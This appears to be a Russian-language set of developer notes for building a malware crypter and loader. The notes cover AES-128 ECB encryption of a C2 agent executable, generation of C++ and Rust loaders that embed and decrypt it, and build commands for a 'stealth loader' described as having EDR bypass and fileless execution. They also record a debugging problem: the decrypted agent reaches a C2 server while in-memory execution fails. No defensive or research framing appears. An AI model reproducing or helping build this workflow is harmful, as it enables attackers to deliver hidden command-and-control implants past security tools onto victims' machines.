
Проблема с runtime_loader
Что происходит:

runtime_loader_rust.exe появляется в процессах на секунду и исчезает

agent_dec.exe (сохраненный на диск) успешно подключается к C2 серверу (20.0.0.160:443)

In-memory execution не работает как ожидалось

														`СБОРКА
cd C:\TEMP\CppObfuscator\runtime_loader_rust

cargo clean										
cargo build --release														

														
														

														`RUST


Вариант 1: Запуск из корня проекта

cd C:\TEMP\CppObfuscator
.\runtime_loader_rust\target\release\runtime_loader_rust.exe


C:\TEMP\CppObfuscator\runtime_loader_rust\


# PowerShell (в каталоге sample и output) - проверка Хэш-сумм
Get-FileHash sample\agent.x64.exe -Algorithm SHA256
Get-FileHash output\agent_dec.exe -Algorithm SHA256


====================================		Обновленный workflow

`1. Шифрование исходного payload (sample\agent.x64.exe)
cd exe_guard
python exe_encryptor.py

							Берет исходный executable файл (например, agent.x64.exe)
							Шифрует его с помощью AES-128 ECB алгоритма
							Генерирует случайный 16-байтовый ключ
							Сохраняет результат в output/encrypted_agent.exe + output/agent_aes.key



`2. Генерация C++ загрузчика			(просто тест)
\exe_guard\
python loader_generator.py

							Создает традиционный C++ код загрузчика в /exe_guard/output/exe_loader.cpp
							Генерирует код который читает внешние файлы (encrypted_agent.exe + agent_aes.key)
							Расшифровывает payload и записывает в %TEMP%\agent_dec.exe
							Запускает расшифрованный файл через system() вызов
							НЕ fileless и НЕ stealth подход



`3. НОВОЕ: Генерация Rust данных
python exe_guard\rust_loader_generator.py

							Читает зашифрованный файл и AES ключ из output/
							Встраивает данные прямо в код - создает src/data.rs с массивами байтов
							Генерирует ENCRYPTED_AGENT и AES_KEY как статические массивы
							Обеспечивает полную автономность executable файла



`4. Сборка Rust loader
cd C:\TEMP\CppObfuscator\runtime_loader_rust\
cargo build --release			 `Консоль скрыта
cargo build						 `Консоль видна


							Компилирует Rust проект в release режиме с максимальной оптимизацией
							Встраивает зашифрованную полезную нагрузку из src/data.rs в итоговый .exe
							Создает target/release/runtime_loader_rust.exe - полностью автономный stealth loader
							Включает EDR bypass, fileless execution, и скрытый режим работы



====================================
`Зашифровать .exe файл с помощью AES-128 ECB (зашифрованный .exe → output/encrypted_<name>.exe и ключ → output/<name>_aes.key)
python exe_guard/exe_encryptor.py



`генерирует C++ код загрузчика И сохраняет его в файл output/exe_loader.cpp
python exe_guard/loader_generator.py


`компилируешь этот .cpp в exe_loader.exe, который будет:
															читать encrypted_agent.exe
															расшифровывать его с помощью agent_aes.key
															запускать результат как обычный процесс

cl /nologo /Ox /EHsc output/exe_loader.cpp /link /OUT:exe_loader.exe advapi32.lib